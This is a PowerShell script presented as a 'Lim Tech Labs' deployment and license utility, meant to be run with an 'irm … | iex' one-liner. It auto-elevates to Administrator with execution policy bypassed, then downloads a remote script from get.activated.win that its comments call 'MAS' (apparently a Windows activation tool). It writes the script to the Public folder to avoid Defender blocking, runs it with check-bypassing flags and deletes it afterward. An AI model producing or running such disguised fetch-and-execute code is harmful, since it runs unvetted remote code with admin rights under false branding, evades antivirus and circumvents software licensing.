# ============================================================
#  LIM TECH LABS - System Utility
#  Command: irm activate.limtechlabs.top | iex
# ============================================================

# 1. Auto-Elevate using your exact command
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "Requesting Administrator privileges..." -ForegroundColor Yellow
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm activate.limtechlabs.top | iex`"" -Verb RunAs
    exit
}

# 2. UI Setup
$Host.UI.RawUI.WindowTitle = "Lim Tech Labs - Deployment Tool"
Clear-Host
$Header = @"
############################################################
#                                                          #
#                WELCOME TO LIM TECH LABS                  #
#           System Deployment & License Utility            #
#                                                          #
############################################################
"@
Write-Host $Header -ForegroundColor Cyan
Write-Host "Status: Authenticated (Administrator)" -ForegroundColor Green
Write-Host "Initializing Backend... Please wait.`n" -ForegroundColor Gray

try {
    # 3. Download the MAS code
    $MAS = Invoke-RestMethod -Uri "https://get.activated.win"
    
    # 4. Save to Public folder (Zero spaces, avoids Defender blocking)
    $FilePath = "$env:PUBLIC\LimTech_Engine.cmd"
    [System.IO.File]::WriteAllText($FilePath, $MAS)
    
    # 5. THE ULTIMATE FIX: 
    # -el bypasses the backend's self-elevation check.
    # -qedit forces the backend to stay inside our PowerShell window instead of killing it.
    Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$FilePath`" -el -qedit" -NoNewWindow -Wait
    
    # 6. Cleanup
    Remove-Item -Path $FilePath -Force -ErrorAction SilentlyContinue

} catch {
    Write-Host "Fatal Error: $($_.Exception.Message)" -ForegroundColor Red
    Pause
}
